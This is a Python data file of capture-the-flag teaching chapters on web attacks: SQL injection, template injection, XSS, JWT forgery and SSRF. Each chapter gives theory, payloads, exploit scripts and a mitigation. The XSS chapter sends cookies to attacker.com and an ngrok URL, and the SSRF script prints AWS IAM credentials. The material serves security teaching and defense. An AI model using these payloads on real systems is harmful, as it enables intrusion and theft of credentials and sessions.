"""
CTF Atlas — Web Security Chapters
"""

chapters = {}

chapters["web-sqli-ast"] = {
    "id": "web-sqli-ast",
    "domain": "web",
    "category": "Web Security & Injection",
    "title": "SQL Injection AST Manipulation, Blind Inference & WAF Evasion",
    "subtitle": "Abstract Syntax Tree Tampering, Boolean/Time Timing Oracles, Information Schema & Shell Injection",
    "diagram": """Intended Query: SELECT * FROM users WHERE user = 'USER_INPUT' AND pass = 'PASS_INPUT';
AST with clean input:
           AND
          /   \\
      user='bob' pass='secret'

Malicious Input: admin' --
AST Subverted:
         SELECT
        /      \\
     FROM      WHERE
     users       |
             user = 'admin' (Trailing pass query parsed as comment, pruned from AST!)

In-Band UNION Extraction:
' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--""",
    "theory": """SQL Injection (CWE-89) occurs when untrusted user input is directly concatenated or interpolated into an SQL query string rather than passed as strongly-typed parameters via prepared statements. The database SQL lexical analyzer and parser interpret the attacker's metacharacters (quotes, comments, semicolons) as syntactic tokens, fundamentally restructuring the Abstract Syntax Tree (AST) of the query.

Major SQL Injection Vulnerability Classes:
1. In-Band UNION-Based SQLi: The most direct exploitation vector. The attacker appends a `UNION SELECT` statement to combine the results of the original application query with rows extracted from database metadata tables (`information_schema.tables`, `sqlite_master`). Two strict mathematical invariants must be satisfied: (a) the injected query must select the exact same number of columns as the original query (discovered via `ORDER BY 1, 2, ... N`), and (b) data types across corresponding columns must be compatible.
2. Error-Based SQLi: When database query results are not directly rendered in the HTML response, but verbose SQL error messages are returned. Solvers use functions like MySQL's `extractvalue(1, concat(0x7e, (SELECT version())))` or PostgreSQL's `CAST((SELECT password FROM users) AS INT)` to force the database engine to include extracted data directly inside runtime error strings.
3. Boolean-Based Blind SQLi: Used when no query output and no errors are displayed. The attacker crafts boolean conditions that alter the HTTP response state (e.g. HTTP 200 vs HTTP 404, or the presence of a 'Welcome' string). Plaintext data is recovered character-by-character using binary search over ASCII character values.
4. Time-Based Blind SQLi: When the HTTP response is completely invariant regardless of boolean outcome. The attacker injects sleep primitives (e.g. `SLEEP(5)` in MySQL, `pg_sleep(5)` in PostgreSQL, `WAITFOR DELAY '0:0:5'` in MSSQL). If the tested predicate is true, the response is delayed by 5 seconds, creating a clean timing side channel.""",
    "commands": [
        {
            "cmd": "' UNION SELECT null, table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
            "why": "Extracts table names from current database in in-band UNION injections.",
            "when": "After determining column count and identifying a reflected text column.",
            "internals": "information_schema is the ANSI-standard metadata catalogue implemented by MySQL, PostgreSQL, and MSSQL.",
            "pitfalls": "SQLite does not have information_schema. Use `SELECT tbl_name FROM sqlite_master WHERE type='table'` for SQLite."
        },
        {
            "cmd": "sqlmap -u 'http://target/item?id=1' --batch --dbs --tamper=space2comment,between",
            "why": "Automates SQLi detection, database enumeration, and bypasses signature-based WAFs.",
            "when": "Authorized assessments and CTF challenges where manual payload crafting is tedious.",
            "internals": "Iterates through heuristic injection polyglots and tests blind timing thresholds.",
            "pitfalls": "Can be noisy and may exhaust database connection pools on fragile target services."
        },
        {
            "cmd": "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1)) > 80-- -",
            "why": "Executes binary search across character byte values in blind boolean exploitation.",
            "when": "When target page returns subtle visual differences (e.g. User Found vs User Not Found).",
            "internals": "SUBSTRING isolates 1 character; ASCII converts to integer; comparison creates boolean condition.",
            "pitfalls": "Ensure limit and offset are specified if subquery returns multiple rows, otherwise subquery returns error."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: Python `requests` script with binary search recovers a 32-character flag in ~200 HTTP requests in 5 seconds.",
        "gui_workflow": "Burp Suite Intruder / Repeater: Send request to Repeater -> test quote -> observe response length -> craft payload manually.",
        "speed_tip": "In CTF competitions, write a quick Python binary search script instead of linear scanning. A 32-character flag takes only 32 * 7 = 224 HTTP requests with binary search, versus 32 * 64 = 2048 requests with linear search."
    },
    "triage_workflow": [
        "1. Identify Injection Point: Inject `'`, `\"`, `\\`, and check for syntax errors or anomalous responses.",
        "2. Determine Database Engine: Inject comment sequences (`-- -` for MySQL/Postgres, `#` for MySQL, `/*` for general).",
        "3. Determine Column Count: Test `' ORDER BY 1-- -`, `' ORDER BY 5-- -`, `' ORDER BY 10-- -`.",
        "4. Determine Reflected Column Types: Inject `' UNION SELECT 1, 'test', 3-- -`.",
        "5. Enumerate Schema: Extract tables and column names from information_schema / sqlite_master.",
        "6. Dump Credentials / Flag: `SELECT group_concat(flag) FROM secret_flags`."
    ],
    "writeup": {
        "ctf_event": "PortSwigger Web Security / HackTheBox",
        "challenge_name": "Blind SQLi with Time Delays (Binary Search)",
        "scenario": "A tracking cookie 'TrackingId' is vulnerable to time-based blind SQL injection in a PostgreSQL backend.",
        "solve_steps": [
            "1. Test timing probe: `Cookie: TrackingId=x' || (SELECT pg_sleep(5))--`.",
            "2. Server pauses for 5 seconds: Time-based SQLi confirmed.",
            "3. Formulate binary search condition: `TrackingId=x' || (SELECT CASE WHEN (ascii(substr(password, {pos}, 1)) > {mid}) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--`.",
            "4. Multi-thread solver across character positions 1..32.",
            "5. Reconstruct password: `s3cr3t_p4ssw0rd_2026`.",
            "6. Log in as administrator and retrieve flag from /admin/panel."
        ],
        "exploit_code": """#!/usr/bin/env python3
import requests, time

TARGET = "http://target.ctf/filter"

def check(pos, mid):
    payload = f"x' || (SELECT CASE WHEN (ascii(substr(password, {pos}, 1)) > {mid}) THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"
    t0 = time.time()
    requests.get(TARGET, cookies={"TrackingId": payload}, timeout=10)
    return (time.time() - t0) >= 1.8

def solve():
    recovered = ""
    for pos in range(1, 25):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            if check(pos, mid):
                low = mid + 1
            else:
                high = mid - 1
        recovered += chr(low)
        print(f"[+] Character {pos}: {chr(low)} -> {recovered}")

if __name__ == '__main__':
    solve()""",
        "flag": "CTF{B1N4RY_S34RCH_BL1ND_SQL1_W1N}",
        "mitigation": "Utilize parameterized queries / prepared statements exclusively (e.g. PreparedStatement in Java, PDO in PHP, parameterized SQL in Python). Never concatenate user strings into queries."
    }
}

chapters["web-ssti"] = {
    "id": "web-ssti",
    "domain": "web",
    "category": "Web Security & RCE",
    "title": "Server-Side Template Injection (SSTI) & Sandbox Escapes",
    "subtitle": "Template Engine AST Lifecycles, Jinja2/Twig Reflection, Python MRO Traversal & Arbitrary Execution",
    "diagram": """+-------------------------------------------------------------+
|                     User HTTP Request                       |
|  GET /hello?name={{7*7}}                                    |
+------------------------------+------------------------------+
                               |
+------------------------------v------------------------------+
|            Web Application Server (Flask / Python)          |
|  Vulnerable: render_template_string("Hello " + name)        |
+------------------------------+------------------------------+
                               |
+------------------------------v------------------------------+
|              Jinja2 Template Engine Evaluation              |
|  1. Parser identifies `{{ ... }}` interpolation delimiters  |
|  2. Evaluates expression in Python AST environment          |
|  3. Resolves {{7*7}} -> 49                                  |
|  4. Attacker leverages Python MRO (Method Resolution Order)  |
|     ''.__class__.__mro__[1].__subclasses__()                |
|     -> Traverses down to `subprocess.Popen`                 |
|     -> Spawns `/bin/sh` or executes shellcode               |
+-------------------------------------------------------------+""",
    "theory": """Server-Side Template Injection (SSTI) emerges when user-controlled input is embedded directly into a template file or template string before parsing, rather than passed as dynamic data parameters to an already compiled template. Template engines (Jinja2 for Python, Twig for PHP, Freemarker/Velocity for Java, Pebble for Kotlin) compile template syntax into executable host-language code or bytecode.

When a template engine receives unescaped syntax markers (such as `{{ ... }}` in Jinja2/Twig, or `${...}` in Freemarker/JSP), it transitions out of static text emission mode and directly evaluates expressions in its runtime context. In Python/Flask applications utilizing Jinja2, the execution environment retains access to Python object introspection.

Python MRO (Method Resolution Order) Traversal:
Python's object inheritance allows any instance to traverse upward to the base `object` class via `__class__.__mro__` or `__class__.__bases__`. From `object`, the `__subclasses__()` method returns an array of every class loaded into memory by the Python interpreter process. Solvers iterate through this subclass array to locate classes with operating system execution capabilities, such as `subprocess.Popen`, `os._wrap_close`, or `warnings.catch_warnings` (which imports `builtins.eval`). Once reached, the attacker executes arbitrary shell commands on the underlying web host.""",
    "commands": [
        {
            "cmd": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            "why": "Dumps all loaded Python classes into the HTTP response to discover available RCE gadgets.",
            "when": "Confirming Jinja2 template engine execution following successful `{{7*7}}` math verification.",
            "internals": "Traverses string class inheritance to object, invoking object.__subclasses__() list reflection.",
            "pitfalls": "Array index numbers vary across Python minor versions. Always search dynamically for 'Popen'."
        },
        {
            "cmd": "{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}",
            "why": "Direct short RCE gadget in modern Jinja2 bypassing long MRO array indexing.",
            "when": "When global builtins are not strictly filtered.",
            "internals": "Accesses the `cycler` helper class's global module dictionary containing the imported `os` module.",
            "pitfalls": "Blocked if the template environment overrides globals with a restricted sandbox."
        },
        {
            "cmd": "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
            "why": "Traverses the Flask request object globals to reach Python's __import__ primitive.",
            "when": "Testing Flask/Werkzeug web endpoints where the `request` variable is exposed to templates.",
            "internals": "Navigates WSGI application reference table into CPython builtins dictionary.",
            "pitfalls": "Fails on pure Jinja2 standalone scripts that do not pass Flask context objects."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: `curl -G 'http://target/profile' --data-urlencode 'name={{cycler.__init__.__globals__.os.popen(\"cat flag*\").read()}}'` -> instant terminal execution.",
        "gui_workflow": "Burp Suite: Intercept request -> Send to Repeater -> Inject payload in parameter -> Inspect response tab for command output.",
        "speed_tip": "Use tplmap (`python2 tplmap.py -u 'http://target/page?name=*' --os-shell`) to automatically detect template engine flavor (Jinja, Mako, Twig, Velocity) and spawn an interactive shell."
    },
    "triage_workflow": [
        "1. Polyglot Syntax Probe: Inject `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}` to identify template engine syntax.",
        "2. Engine Fingerprinting: Differentiate Jinja2 from Twig using `{{7*'7'}}` (Jinja2 returns '7777777', Twig returns '49').",
        "3. Introspection Exploration: Test access to `__class__` or `self`.",
        "4. Subclass Search: Locate `subprocess.Popen` index in `object.__subclasses__()`.",
        "5. Payload Formulation: Execute `Popen(['cat', '/flag.txt'], stdout=-1).communicate()`.",
        "6. Filter Evasion (if needed): If dots or quotes are filtered, use `request.args` reflection or `dict(b=1)`."
    ],
    "writeup": {
        "ctf_event": "HackTheBox / PicoCTF",
        "challenge_name": "Templated (Jinja2 SSTI to Shell)",
        "scenario": "A Flask web service presents an 'Under Construction' notice displaying the requested path: 'Error 404: /<path> not found'.",
        "solve_steps": [
            "1. Test math expression in URL: curl http://target.ctf/{{7*7}} -> 'Error 404: 49 not found'. SSTI confirmed.",
            "2. Distinguish engine: {{7*'7'}} -> '7777777'. Python Jinja2 engine confirmed.",
            "3. Search for Popen class in subclasses list using short script.",
            "4. Subclass index 414 is `subprocess.Popen`.",
            "5. Execute command: curl 'http://target.ctf/{{''.__class__.__mro__[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].decode()}}'",
            "6. Read flag from response: CTF{J1NJ42_SST1_PYTH0N_MRO_PWN3D}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import requests, urllib.parse

TARGET = "http://target.ctf/"
payload = "{{ ''.__class__.__mro__[1].__subclasses__()[414]('cat flag.txt',shell=True,stdout=-1).communicate()[0].decode() }}"
url = TARGET + urllib.parse.quote(payload)

r = requests.get(url)
print("[+] Response:", r.text.strip())""",
        "flag": "CTF{J1NJ42_SST1_PYTH0N_MRO_PWN3D}",
        "mitigation": "Always pass dynamic data as keyword arguments to `render_template('index.html', name=user_input)` rather than using `render_template_string()` with concatenated strings."
    }
}

chapters["web-xss-csp"] = {
    "id": "web-xss-csp",
    "domain": "web",
    "category": "Web Security & Client-Side",
    "title": "Cross-Site Scripting (XSS), Context Escaping & CSP Bypass Mechanics",
    "subtitle": "DOM, Reflected & Stored Execution Lifecycles, Browser Isolation Boundaries & Cookie Exfiltration",
    "diagram": """+-----------------------------------------------------------------+
|                    Cross-Site Scripting Lifecycle               |
+-----------------------------------------------------------------+
Attacker                 Vulnerable Web App            Victim Browser (Admin Bot)
   |                             |                                  |
   | --- 1. Injected Payload --->|                                  |
   |     <script>fetch(...)      |                                  |
   |                             |                                  |
   |                             | --- 2. Render Unescaped HTML --->|
   |                             |                                  |
   |                             |        [ JavaScript Executed! ] -+
   |                             |        - Reads document.cookie   |
   |                             |        - Submits background form |
   | <--- 3. Exfiltrated Token -------------------------------------+""",
    "theory": """Cross-Site Scripting (XSS, CWE-79) occurs when an application includes untrusted data in an HTTP response without adequate validation or context-sensitive encoding, enabling the client browser to interpret user data as executable JavaScript.

The Three Classic XSS Paradigms:
1. Reflected XSS: Non-persistent. The malicious payload is reflected immediately off the web server in the current HTTP response (common in search bars, error messages, and URL parameters). The victim must be induced to click a crafted link.
2. Stored XSS: Persistent. The payload is permanently stored in the application's backend database (comments, user profiles, chat messages). Any user who views the stored content executes the payload automatically. In CTF competitions, challenges frequently provide an 'Admin Bot' (headless Chromium or Puppeteer) that regularly visits solver-submitted URLs.
3. DOM-Based XSS: Purely client-side. The vulnerability lives entirely in front-end JavaScript: an untrusted 'source' (e.g. `location.search`, `location.hash`, `document.referrer`) flows into an unsafe execution 'sink' (e.g. `element.innerHTML`, `document.write()`, `eval()`). Server-side web filters never see DOM XSS payloads because URL fragments (`#...`) are not transmitted in HTTP requests.

Content Security Policy (CSP) & Bypasses:
CSP (RFC 7762) is a browser defense-in-depth header (`Content-Security-Policy: script-src 'self' ...`) restricting origins from which scripts can load or execute. Common CTF bypasses include:
- `unsafe-inline`: Permits inline `<script>` tags, defeating script-src.
- CDN Endpoints: If `script-src` whitelists `cdnjs.cloudflare.com` or `ajax.googleapis.com`, attackers load older AngularJS or Vue libraries containing known client-side template injection gadgets to achieve code execution.
- Base-URI Injection: If `base-uri` is missing, injecting `<base href="//attacker.com/">` redirects relative `<script src="app.js">` requests to the attacker's server.""",
    "commands": [
        {
            "cmd": "<script>fetch('http://attacker.com/leak?c='+encodeURIComponent(document.cookie))<\\/script>",
            "why": "Standard non-destructive cookie exfiltration payload.",
            "when": "When HTTP response context permits unescaped HTML tags.",
            "internals": "Invokes asynchronous Fetch API to transmit session cookies to external listener.",
            "pitfalls": "Blocked if session cookies have the `HttpOnly` flag set."
        },
        {
            "cmd": "<img src=x onerror=\"fetch('http://attacker.com/?flag='+document.body.innerText)\">",
            "why": "Bypasses filters that specifically strip `<script>` tags by utilizing the `onerror` attribute.",
            "when": "Testing input sanitizers with naive script regexes.",
            "internals": "Browser parses image tag, fails to resolve source 'x', and triggers JavaScript event handler.",
            "pitfalls": "Blocked if quote characters (`\"` or `'`) are filtered; bypass via `String.fromCharCode()`."
        },
        {
            "cmd": "curl -sI https://target.ctf | grep -i content-security-policy",
            "why": "Inspects active Content Security Policy directives to plan bypass strategy.",
            "when": "Before formulating XSS payloads on hardened web applications.",
            "internals": "Parses HTTP response header tokens.",
            "pitfalls": "CSP can also be declared inside `<meta http-equiv='Content-Security-Policy'>` tags in HTML body."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: Start local listener: `python3 -m http.server 8000` or `nc -lvnp 8000` -> Submit URL to target CTF admin bot -> Watch cookie hit.",
        "gui_workflow": "Browser DevTools: Open Console tab -> test `document.cookie` -> Inspect DOM Tree to view exact payload placement and encoding context.",
        "speed_tip": "If external egress is blocked, exfiltrate data via Webhook.site or ngrok URL provided in the prompt."
    },
    "triage_workflow": [
        "1. Identify Reflection Context: Is input inside HTML body, inside an attribute `value=\"...\"`, inside a `<script>` block, or in the DOM?",
        "2. Test Metacharacters: Inject `< > \" ' ` / = ( )` and observe which are sanitized or escaped.",
        "3. Context Escaping: If inside an attribute: `\" autofocus onfocus=\"alert(1)`. If inside script: `';alert(1)//`.",
        "4. Audit CSP Directives: Inspect `script-src`, `connect-src`, and `default-src`.",
        "5. Formulate Exfiltration: Send flag or cookie to attacker endpoint via `fetch()`, `navigator.sendBeacon()`, or `new Image().src`."
    ],
    "writeup": {
        "ctf_event": "Google CTF / PicoCTF",
        "challenge_name": "Note-Sharer (Stored XSS to Admin Cookie)",
        "scenario": "A note-sharing application allows users to submit markdown notes. An 'Report Note to Admin' button triggers an automated headless Chrome bot that opens the note.",
        "solve_steps": [
            "1. Inspect markdown rendering: The application converts markdown using a vulnerable library that passes raw HTML tags.",
            "2. Verify XSS execution locally: `<img src=x onerror=console.log(1)>` executes.",
            "3. Audit cookie security: Target cookie has no `HttpOnly` flag.",
            "4. Start external listener: `ngrok http 8080`.",
            "5. Submit note payload: `<script>fetch('https://ngrok.io/log?c=' + document.cookie)<\\/script>`.",
            "6. Report note URL to admin bot.",
            "7. Listener receives GET request with cookie: `admin_session=CTF{XSS_D0M_C00K1E_TH1EF_2026}`."
        ],
        "exploit_code": """#!/usr/bin/env python3
import requests

TARGET = "http://target.ctf/create"
EXFIL_URL = "http://attacker.com/leak?cookie="

payload = f"<script>navigator.sendBeacon('{EXFIL_URL}' + encodeURIComponent(document.cookie));<\\/script>"
r = requests.post(TARGET, data={"title": "Test", "content": payload})
note_id = r.json()["id"]

print(f"[+] Reporting note {note_id} to admin bot...")
requests.post("http://target.ctf/report", data={"id": note_id})
print("[+] Awaiting exfiltration on listener...")""",
        "flag": "CTF{XSS_D0M_C00K1E_TH1EF_2026}",
        "mitigation": "Set the `HttpOnly` flag on all sensitive session cookies so client scripts cannot access them. Implement context-aware output encoding (DOMPurify for HTML) and enforce a strict CSP (`script-src 'nonce-...'`)."
    }
}

chapters["web-auth-jwt"] = {
    "id": "web-auth-jwt",
    "domain": "web",
    "category": "Web Security & Authentication",
    "title": "JSON Web Token (JWT) Cryptanalysis & Session Forgery",
    "subtitle": "Compact JWS/JWE Framing, Algorithm Confusion (RS256->HS256), None-Alg & JKU Injection",
    "diagram": """+-----------------------------------------------------------------+
|                    JWT Structural Architecture                  |
+-----------------------------------------------------------------+
[ Header ]                    [ Payload ]               [ Signature ]
{"alg":"RS256","typ":"JWT"} . {"user":"alice","role":"user"} . [ Binary HMAC / RSA ]
  |                              |                            |
  +-- Base64URL-encoded          +-- Base64URL-encoded        +-- Base64URL-encoded

ATTACK VECTORS:
1. Alg: None Attack:
   Change Header to {"alg":"none"}. Delete signature!
   -> Server with naive parser accepts unsigned token!

2. RS256 -> HS256 Key Confusion:
   Server expects RS256 (verifies with RSA Public Key).
   Attacker changes alg to HS256 (symmetric HMAC).
   Server verifies signature using its RSA Public Key AS THE HMAC SECRET KEY!
   Attacker has the public key, so attacker can forge valid signatures!""",
    "theory": """JSON Web Tokens (JWT, RFC 7519) are compact, URL-safe data transfer tokens widely utilized in modern single-page applications (SPAs) and stateless REST API architectures for claims assertion and authentication state. A JSON Web Signature (JWS) comprises three dot-separated Base64URL-encoded segments: `Header.Payload.Signature`.

Prominent Cryptographic & Parser Failure Classes:
1. The 'None' Algorithm Vulnerability (CVE-2015-9235): The JWS specification includes an `alg: "none"` value designed for unsecured tokens. If a backend authentication library verifies tokens by dynamically inspecting the header's `alg` field without enforcing an application-mandated algorithm whitelist, an attacker can modify the payload (e.g. `{"role": "admin"}`), set `alg: "none"`, and strip the signature entirely (`header.payload.`). The server treats the token as valid.
2. Algorithm Confusion (Asymmetric to Symmetric / RS256 to HS256): In RS256, the server signs tokens using a private RSA key and verifies them using a public RSA key. If the attacker tampers with the header to specify `alg: "HS256"`, an insecure library may invoke `jwt.verify(token, server_public_key)`. But for HS256, the verification function treats the second parameter NOT as an RSA key, but as a raw symmetric shared secret! Because the public key is publicly accessible, the attacker signs the forged token with the public key bytes using HMAC-SHA256, producing a signature the server accepts.
3. JKU (JWK Set URL) Header Injection: Some JWT implementations permit the header to specify a `jku` parameter pointing to a remote JSON Web Key Set file (`https://.../.well-known/jwks.json`). If the server does not validate the host domain, the attacker hosts their own key pair on an external server and sets `jku` to their own URL, signing the token with their own private key.""",
    "commands": [
        {
            "cmd": "python3 -c \"import jwt; print(jwt.encode({'user':'admin','role':'admin'}, '', algorithm='none'))\"",
            "why": "Generates an unsigned JWT with none-algorithm for testing authorization bypasses.",
            "when": "Testing initial JWT verification implementations.",
            "internals": "Base64URL encodes header and payload; signature segment is left empty.",
            "pitfalls": "PyJWT >= 2.0 strictly requires explicit algorithm specification; use older or custom formatting for testing."
        },
        {
            "cmd": "jwt_tool <TOKEN> -X a",
            "why": "Automates automated testing of the 'alg: none' vulnerability across multiple variations.",
            "when": "Automated security scanning of API tokens.",
            "internals": "Tests uppercase 'NONE', lowercase 'none', 'None', and trailing dot variations.",
            "pitfalls": "Ensure jwt_tool dependencies are installed in virtual environment."
        },
        {
            "cmd": "jwt_tool <TOKEN> -S hs256 -k public.pem",
            "why": "Executes the RS256 to HS256 algorithm confusion attack using the server's public key.",
            "when": "When target application uses asymmetric RSA signatures and public key is known.",
            "internals": "Calculates HMAC-SHA256 digest using public key file bytes as secret key.",
            "pitfalls": "Public key format (PKCS#1 vs PKCS#8 vs raw SPKI) must match the exact string format expected by target server library."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: Python script using `hashlib` and `base64` creates forged token in 5 lines without external dependencies.",
        "gui_workflow": "Burp Suite: JWT Editor extension. Automatically highlights, parses, signs, and attacks JWT tokens in Repeater.",
        "speed_tip": "In CyberChef: Use 'JWT Decode' recipe to inspect header and claims immediately without terminal commands."
    },
    "triage_workflow": [
        "1. Capture Token: Extract `Bearer <token>` from Authorization header or cookie.",
        "2. Decode Segments: Inspect header `alg` and payload claims.",
        "3. Test None Algorithm: Re-encode with `alg: 'none'` and empty signature.",
        "4. Check for Weak Secrets: If HS256, run `hashcat -m 16500 jwt.txt rockyou.txt`.",
        "5. Test Key Confusion: If RS256, obtain public key (e.g. from `/jwks.json` or SSL cert) and sign with HS256.",
        "6. Submit Forged Token: Access protected endpoint `/api/admin`."
    ],
    "writeup": {
        "ctf_event": "DEF CON Qualifier / HackTheBox",
        "challenge_name": "Auth-Confused (JWT RS256 to HS256)",
        "scenario": "A target bank API authorizes transfers using JWTs signed with RS256. The server public key is available at http://target.ctf/public.key.",
        "solve_steps": [
            "1. Download public key: `curl -s http://target.ctf/public.key > pub.key`.",
            "2. Decode current user token: `{'user': 'guest', 'admin': false}`.",
            "3. Modify payload to: `{'user': 'admin', 'admin': true}`.",
            "4. Modify header to: `{'alg': 'HS256', 'typ': 'JWT'}`.",
            "5. Sign new token with HMAC-SHA256 using the raw bytes of `pub.key` as the secret key.",
            "6. Send request with forged token: `curl -H 'Authorization: Bearer ...' http://target.ctf/admin/flag`.",
            "7. Flag: CTF{JWT_ALGORITHM_CONFUSION_PWN}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import hmac, hashlib, base64, json

pub_key = open("pub.key", "rb").read()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"user": "admin", "admin": True}

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

part1 = b64url(json.dumps(header).encode())
part2 = b64url(json.dumps(payload).encode())
unsigned = f"{part1}.{part2}".encode()

sig = hmac.new(pub_key, unsigned, hashlib.sha256).digest()
token = f"{part1}.{part2}.{b64url(sig)}"
print("[+] Forged Token:\\n", token)""",
        "flag": "CTF{JWT_ALGORITHM_CONFUSION_PWN}",
        "mitigation": "Hardcode the expected algorithm server-side (e.g. `jwt.verify(token, key, algorithms=['RS256'])`). Never allow the token header's `alg` value to choose the verification algorithm."
    }
}

chapters["web-ssrf"] = {
    "id": "web-ssrf",
    "domain": "web",
    "category": "Web Security & Cloud Pivots",
    "title": "Server-Side Request Forgery (SSRF) & Internal Network Pivoting",
    "subtitle": "Cloud Metadata API Extraction (169.254.169.254), Protocol Smuggling & Gopher Exploitation",
    "diagram": """+-----------------------------------------------------------------+
|                 Server-Side Request Forgery (SSRF)              |
+-----------------------------------------------------------------+
Attacker                    Vulnerable Web Server               Internal Infrastructure
   |                                 |                                    |
   | --- POST /fetch?url=... ------->|                                    |
   |     url=http://169.254.169.254  |                                    |
   |                                 | --- 1. Queries Cloud Metadata ---->| (AWS IMDS API)
   |                                 |<--- 2. Returns IAM Credentials ----|
   |                                 |                                    |
   |                                 | --- 3. Queries Internal Redis ---->| (gopher://...:6379)
   |                                 |        Executes CONFIG SET         | (Drops web shell!)
   |<--- Leaked Credentials / Shell -+                                    |""",
    "theory": """Server-Side Request Forgery (SSRF, CWE-918) occurs when a web application fetches a remote resource without validating the user-supplied destination URL. Because the request originates from the trusted server backend rather than the attacker's client browser, the request bypasses network perimeter firewalls, network address translation (NAT), and VPC routing rules.

High-Impact SSRF Target Vectors:
1. Cloud Instance Metadata Services (IMDS):
   Cloud providers expose a link-local non-routable IP address (`169.254.169.254`) accessible only from within virtual machine instances.
   - AWS IMDSv1: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`. Returns temporary AWS SecretAccessKey, AccessKeyId, and Token.
   - AWS IMDSv2: Requires a `PUT` request with `X-aws-ec2-metadata-token-ttl-seconds: 21600` to retrieve a session token, defeating basic GET-only SSRF vulnerabilities.
   - GCP: Requires the header `Metadata-Flavor: Google`.
   - DigitalOcean: `http://169.254.169.254/metadata/v1.json`.
2. Protocol Smuggling via Gopher (`gopher://`):
   The Gopher protocol (RFC 1436) transmits arbitrary raw bytes over TCP without framing or handshakes. Attackers utilize gopher URLs (`gopher://127.0.0.1:6379/_<URL-encoded-payload>`) to interact with internal unauthenticated services, such as:
   - Redis: Executing `CONFIG SET dir /var/www/html` and `CONFIG SET dbfilename shell.php` to drop web shells.
   - Memcached: Dumping session tokens and cached credentials.
   - FastCGI: Interacting directly with PHP-FPM on port 9000 to achieve instant remote code execution.""",
    "commands": [
        {
            "cmd": "curl -s 'http://target.ctf/proxy?url=http://169.254.169.254/latest/meta-data/'",
            "why": "Tests for AWS Cloud Metadata accessibility via server-side proxy endpoint.",
            "when": "Testing web applications hosted on AWS EC2 or Elastic Beanstalk.",
            "internals": "Hypervisor virtual networking layer intercepts link-local 169.254.169.254 queries.",
            "pitfalls": "Fails if IMDSv2 is enforced or server-side URL parser validates IP prefixes."
        },
        {
            "cmd": "curl -s 'http://target.ctf/proxy?url=http://2130706433:80/'",
            "why": "Bypasses naive IP blacklists checking for '127.0.0.1' or 'localhost' by using decimal integer representation of loopback.",
            "when": "Target application validates URL with regex for 127.0.0.1.",
            "internals": "Operating system resolver parses 2130706433 as 0x7F000001 (127.0.0.1).",
            "pitfalls": "Alternative representations: hex (0x7f000001), octal (0177.0.0.1), or IPv6 (::1)."
        },
        {
            "cmd": "gopherus --exploit redis",
            "why": "Generates gopher payloads to exploit internal Redis daemons and write web shells or SSH keys.",
            "when": "SSRF confirmed and target server has internal Redis running on port 6379.",
            "internals": "Constructs Redis RESP protocol commands formatted into a gopher URL.",
            "pitfalls": "Requires cURL or underlying HTTP client library to have Gopher protocol enabled (disabled by default in some modern distributions)."
        }
    ],
    "cli_vs_gui": {
        "cli_workflow": "CLI: `curl 'http://target/fetch?url=gopher://127.0.0.1:6379/_...` spawns shell in seconds.",
        "gui_workflow": "Burp Collaborator: Generate unique collaborator domain -> inject into SSRF parameter -> observe DNS/HTTP interaction in Collaborator tab.",
        "speed_tip": "If 127.0.0.1 is filtered, use public DNS services that resolve to localhost, such as `127.0.0.1.nip.io` or `localtest.me`."
    },
    "triage_workflow": [
        "1. Identify Remote Fetching Functionality: Webhooks, PDF generators, avatar URLs, file upload via URL.",
        "2. Probe Internal Loopback: Test `http://127.0.0.1/`, `http://localhost/`, `http://[::]:80/`.",
        "3. Bypass Filters: Test decimal IPs (`2130706433`), DNS rebinding, or URL redirects.",
        "4. Query Cloud Metadata: Test `http://169.254.169.254/latest/meta-data/`.",
        "5. Port Scan Internal Network: Iterate port numbers 1..1000 on 127.0.0.1 to identify listening internal services.",
        "6. Exploit Internal Services: Smuggle commands to Redis (6379), SMTP (25), or PHP-FPM (9000)."
    ],
    "writeup": {
        "ctf_event": "Google CTF / HackTheBox",
        "challenge_name": "Cloud-Puppy (SSRF to AWS IMDS Credentials)",
        "scenario": "A web application generates website previews using a URL input parameter. The backend runs on an AWS EC2 instance.",
        "solve_steps": [
            "1. Test loopback: `http://127.0.0.1/` returns 'Access Denied: Local IP blocked'.",
            "2. Bypass IP filter using decimal representation: `http://2130706433/` returns internal status page.",
            "3. Target AWS metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.",
            "4. Discovers role name: `s3-flag-reader`.",
            "5. Query role credentials: `.../security-credentials/s3-flag-reader`.",
            "6. Receives AWS AccessKeyId, SecretAccessKey, and Token.",
            "7. Configure AWS CLI locally and dump S3 bucket: `aws s3 cp s3://company-flags/flag.txt .`.",
            "8. Flag: CTF{SSRF_CL0UD_M3T4D4T4_AWS_PWN3D}"
        ],
        "exploit_code": """#!/usr/bin/env python3
import requests, json

TARGET = "http://target.ctf/preview?url="
IMDS = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

r = requests.get(TARGET + IMDS)
role = r.text.strip()
print("[+] Discovered Role:", role)

creds = requests.get(TARGET + IMDS + role).json()
print("[+] AccessKeyId:", creds["AccessKeyId"])
print("[+] SecretAccessKey:", creds["SecretAccessKey"])
print("[+] Token:", creds["Token"])""",
        "flag": "CTF{SSRF_CL0UD_M3T4D4T4_AWS_PWN3D}",
        "mitigation": "Enforce IMDSv2 across cloud environments (requires PUT token header). Disallow private and loopback IP ranges in backend HTTP clients using strict URL validation and dedicated firewall egress policies."
    }
}
